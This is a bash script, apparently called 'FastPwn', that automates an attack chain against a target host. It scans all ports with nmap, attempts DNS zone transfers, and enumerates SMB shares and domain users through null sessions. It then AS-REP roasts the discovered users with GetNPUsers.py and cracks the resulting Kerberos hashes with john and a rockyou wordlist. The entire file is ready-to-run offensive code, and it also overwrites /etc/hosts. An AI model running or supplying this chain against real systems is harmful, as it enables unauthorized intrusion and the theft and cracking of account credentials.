#!/bin/bash

#COLORS
GRN='\e[32m'
RED='\e[31m'
YLW='\e[33m'
DEF='\e[0m'
CYN='\e[36m'
WHT='\e[37m'

#Banner
banner=(''
$GRN"
███████╗ █████╗ ███████╗████████╗██████╗ ██╗    ██╗███╗   ██╗
██╔════╝██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██║    ██║████╗  ██║
█████╗  ███████║███████╗   ██║   ██████╔╝██║ █╗ ██║██╔██╗ ██║
██╔══╝  ██╔══██║╚════██║   ██║   ██╔═══╝ ██║███╗██║██║╚██╗██║
██║     ██║  ██║███████║   ██║   ██║     ╚███╔███╔╝██║ ╚████║
╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝\n"$DEF
$YLW"Coded By AT7\n"$DEF)
printf "${banner[*]}"


#Arguments
if [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
  echo "Usage: `basename $0` <ip or domain>"
  exit 0
fi
if [ "$#" -eq 0 ]
then
    echo "Usage: `basename $0` <ip or domain>"
    exit 0
fi

#Is Target Live?
printf $CYN"[+] Checks if the target is live\n"$DEF
fping -c1 -t300 $1 2>/dev/null 1>/dev/null
if [ "$?" = 0 ]
then
  printf $GRN"[+] Host is live\n"$WHT
else
  printf $RED"[+] Host is not live\n"
  exit 0
fi

#Target dir
if [ -d "$1" ] 
	then printf $RED"[+] $1 Directory is exist\n";
else
	mkdir $1 && printf $GRN"[+] Created $1 Directory\n";
fi

#nmap
printf $CYN"[+] Starting nmap Fast scan\n"$DEF
nmap $1 -p- --min-rate 10000 -o $1/nmap.txt && printf $CYN"[+]Starting nmap Full Scan\n"$DEF && grep "/tcp" $1/nmap.txt | cut -d "/" -f 1 | sed -z 's/\n/,/g;s/,$/\n/' | xargs -n1 nmap -O -sCV $1 -o $1/nmap.txt -p 


#OS
os=$(<$1/nmap.txt)
if [[ $os == *"windows"* ]]; then
	printf $GRN"[+] OS is Windows\n"
elif [[ $os == *"linux"* ]]; then
	printf $GRN"[+] OS is Linux\n"
else
	printf $RED"Couldn't identify OS\n"
fi

#Add domain to /etc/hosts
if [[ $os == *"Domain:"* ]];
	then cat $1/nmap.txt| grep -i "Domain:" | cut -d ":" -f 2 | cut -d " " -f 2 | cut -d "," -f 1 | sort -u | xargs -n1 echo "$1   " >> /etc/hosts
elif [[ $os == *"commonName="* ]];
	then cat $1/nmap.txt | grep -i "commonName=" | cut -d "=" -f 2 | sort -u | xargs -n1 echo "$1    " >> /etc/hosts
elif [[ $os == *"DNS:"* ]];
	then cat $1/nmap.txt | grep -i "DNS:" | cut -d ":" -f 3 | sort -u | xargs -n1 echo "$1   " >> /etc/hosts
elif [[ $os == *"Domain name:"* ]];
	then cat $1/nmap.txt | grep -i "Domain name:" | cut -d ":" -f 2 | cut -d " " -f 2 | sort -u | xargs -n1 echo "$1   " >> /etc/hosts
elif [[ $os == *"Forest name:"* ]];
	then cat $1/nmap.txt | grep -i "Forest name:" | cut -d ":" -f 2 | cut -d " " -f 2 | sort -u | xargs -n1 echo "$1   " >> /etc/hosts
fi
printf $GRN"[+] Domain name added to /etc/hosts\n"

#Uniq /etc/hosts
uniq /etc/hosts > /etc/tmpfile && mv /etc/tmpfile /etc/hosts

#Domain
target=$(cat /etc/hosts | grep "$1" | cut -d " " -f 5)

#dig - DNS
if [[ $os == *"53/tcp"* ]];
	then printf $CYN"[+] Digging DNS"$WHT && dig  @"$1" $target && printf $CYN"[+] Zone transfer"$WHT && dig axfr  @"$1" $target && printf $GRN"[+] Done Digging\n"$WHT
fi

#smb
if [[ $os == *"139/tcp"* ]] || [[ $os == *"445/tcp"* ]];
	then printf $CYN"[+] Enumerating SMB\n"$WHT && smbmap -H $1 -u null && echo "Y" | smbclient -L //$1 -U ""; sleep 0 && echo "Y" | smbclient -L //$1; sleep 0 && printf $GRN"[+] Done Enumerating SMB\n"$WHT
fi

#rpc
if [[ $os == *"135/tcp"* ]] || [[ $os == *"139/tcp"* ]] || [[ $os == *"445/tcp"* ]];
	then printf $CYN"[+] Enumerating RPC\n"$WHT && rpcclient -U "" -N $1 -c dsr_enumtrustdom && printf $GRN"[+] Enumerated Users\n"$WHT&& rpcclient -U "" -N $1 -c enumdomusers | cut -d "[" -f 2 | cut -d "]" -f 1 | tee $1/RPCUsers.txt && printf $GRN"[+] Saved users in RPCUsers.txt\n"$WHT && printf $GRN"[+] Done Enumerating RPC\n"$WHT
fi

#AS-REP Roasting
FILE1=$1/RPCUsers.txt 
if [[ $os == *"88/tcp"* ]] && test -f "$FILE1";
	then printf $CYN"[+] Trying AS-REP Roasting\n"$WHT && for user in $(cat $FILE1); do if GetNPUsers.py -no-pass -dc-ip $1 $target/${user} | grep -q 'krb5asrep'; then printf $GRN"Found Hash of user:${user}\n"$WHT  && GetNPUsers.py -no-pass -dc-ip $1 $target/${user}| tail -n1 | tee $1/${user}-Hash.txt&& printf $GRN"[+] Saved Hash in ${user}-Hash.txt\n"$WHT&& printf $CYN"[+] Cracking The Hash of ${user}\n" && john $1/${user}-Hash.txt --wordlist=/usr/share/wordlists/rockyou.txt;fi; done
fi
